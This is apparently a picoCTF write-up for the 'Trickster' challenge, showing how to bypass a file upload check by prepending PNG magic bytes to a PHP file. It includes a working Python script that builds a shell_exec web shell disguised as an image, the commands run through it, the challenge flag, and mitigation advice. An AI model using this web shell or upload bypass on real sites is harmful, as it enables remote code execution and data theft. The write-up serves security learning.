## 🃏 Trickster 

I really enjoyed this challenge since it was my first time dealing with **magic bytes**! 🪄  
So let's jump right in. ⏩

---

### 🔍 1. Initial Attempts:

- ❌ Tried injecting files like `file.anythingexceptforpng` → **failed**  
- ❌ Then tried `file.png.php` → **failed**  

---

### 🔎 2. Reconnaissance:

Like many websites, I checked `url/robots.txt` and found: 📜

![robots.txt](https://github.com/user-attachments/assets/c431c322-8de1-430b-beb9-e8ae7eab8647)

Then, I checked `url/instructions.txt` and found: 🗒️

![instructions.txt](https://github.com/user-attachments/assets/c0ee9885-3595-4885-ab76-129578697d82)

---

### 🎩 3. Magic Bytes Investigation:

Ah-ha! The **magic bytes**. ✨  
After some research, I learned more about **PNG file magic bytes** and how they work.

**Key Takeaway:**  
✅ **You must add the magic bytes of a PNG file at the beginning to bypass the restrictions.**  

---

### 🖥️ 4. Generating the Payload:

I generated a **payload** using **Python** 🐍:

```python
magic_bytes = b'\x89PNG\r\n\x1a\n'

php_code = b"""<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
} else {
    echo "Please provide ?cmd=";
}
?>"""

with open("null.png.php", "wb") as f:
    f.write(magic_bytes)
    f.write(php_code)

print("✅ Created 'null.png.php' with valid PNG magic bytes + PHP command execution payload")
```

🛠️ You **can** manually intercept the request using **Burp Suite**, but automation makes it easier!

---

### ⬆️ 5. Upload and Test:

✅ **Uploaded `null.png.php` successfully!**  
This means **we are on the right track**. 🏆  

---

### 📂 6. Exploring the Uploads Directory:

From the initial investigation, we know there's a `/uploads` directory.  
So, let's **try accessing our uploaded file directly**:

```
url/uploads/null.png.php?cmd=ls -al
```

📸 **Screenshot of directory listing:**  

![directory listing](https://github.com/user-attachments/assets/f03c3cab-5216-4282-be5d-0999062becd7)

Hmm... **Not much interesting here**. 🔍  
Let’s **try reading some files** instead. 📜  

---

### 📖 7. Reading Parent Directory Files:

```
url/uploads/null.png.php?cmd=cat ../*
```

I **didn't know the exact filenames**, so I just **tried a wildcard**. 🎯  

🎉 **And there it is!**  

![flag found](https://github.com/user-attachments/assets/193e8e19-35c1-4f94-b920-c8a66317a8d7)

---

### 🏁 The Flag:

```
🏆 picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e} 🏆
```

---

## 🎓 Lessons Learned:

💡 **Magic bytes are a simple but effective check** in many file upload protections.  
💡 **Understanding file headers** can help bypass naive validation.  
💡 **Intercepting requests** using **Burp Suite** can help manipulate content.  
💡 **Uploading a webshell disguised as a PNG** can lead to **Remote Code Execution**.  
💡 **Directory traversal + command injection** can expose sensitive files.  

---

## 🛡️ Vulnerability Assessment:

This challenge **demonstrates a classic file upload vulnerability** due to **insufficient validation**:

❌ **Server only checks for PNG magic bytes** but does **not validate actual file content.**  
❌ **Attackers can prepend magic bytes to a PHP script** and upload it as an image.  
❌ **Executing uploaded script leads to Remote Code Execution (RCE).**  
❌ **Server lacks isolation or sandboxing**, exposing sensitive directories.

⚠️ **Mitigation Strategies:**
✔️ **Validate file content beyond magic bytes** (e.g., using image parsing libraries).  
✔️ **Block execution permissions on upload directories** 🔒  
✔️ **Enforce strict filename validation** ✅  
✔️ **Implement Web Application Firewalls (WAF) to detect suspicious payloads** 🚧  

  
